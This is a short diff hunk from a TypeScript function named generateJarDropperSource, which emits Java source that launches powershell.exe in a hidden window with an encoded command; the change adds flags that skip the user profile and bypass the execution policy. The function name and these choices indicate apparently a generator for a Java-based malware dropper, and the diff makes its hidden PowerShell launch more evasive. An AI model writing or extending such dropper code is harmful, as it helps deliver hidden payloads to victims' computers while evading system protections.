@@ -553,7 +553,7 @@ function generateJarDropperSource(jarPersist: boolean): string {
     "    String enc=Base64.getEncoder().encodeToString(utf16);",
     "    log(\"ps log will be at: \"+lp);",
     "    log(\"launching powershell\");",
-    "    Process proc=new ProcessBuilder(\"powershell.exe\",\"-NonInteractive\",\"-WindowStyle\",\"Hidden\",\"-EncodedCommand\",enc).start();",
+    "    Process proc=new ProcessBuilder(\"powershell.exe\",\"-NoProfile\",\"-NonInteractive\",\"-WindowStyle\",\"Hidden\",\"-ExecutionPolicy\",\"Bypass\",\"-EncodedCommand\",enc).start();",
     "    log(\"powershell pid=\"+proc.pid());",
     "  }",
     "}",
